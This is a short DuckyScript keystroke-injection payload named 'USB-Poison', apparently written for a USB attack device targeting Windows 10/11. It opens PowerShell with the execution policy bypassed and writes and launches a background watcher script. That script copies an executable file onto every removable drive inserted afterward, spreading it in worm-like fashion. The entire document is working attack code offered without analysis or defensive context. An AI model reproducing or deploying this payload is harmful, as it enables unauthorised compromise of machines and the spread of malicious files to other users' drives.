REM Author:      beigeworm
REM Title:       USB-Poison
REM Target:      Windows 10/11

DEFINE #FILEPATH D:/Tools/idk.exe

LED_G
GUI r
DELAY 500
STRINGLN powershell -Ep Bypass
DELAY 3000
REM Write watcher script using PowerShell here-string (multiline, each line short)
STRINGLN $s=@'
STRINGLN $f="D:/Tools/idk.exe"
STRINGLN $g=@()
STRINGLN while(1){
STRINGLN sleep 1
STRINGLN $h=gwmi Win32_LogicalDisk|?{$_.DriveType-eq 2}|select DeviceID
STRINGLN if($h){
STRINGLN $n=diff $g $h -PassThru|?{$_.SideIndicator-eq'=>'}
STRINGLN if($n){$n|%{cp $f ($_.DeviceID+'/')}}
STRINGLN $g=$h}
STRINGLN }
STRINGLN '@
DELAY 200
STRINGLN $s>w.ps1
DELAY 200
STRINGLN ./w.ps1
DELAY 1000
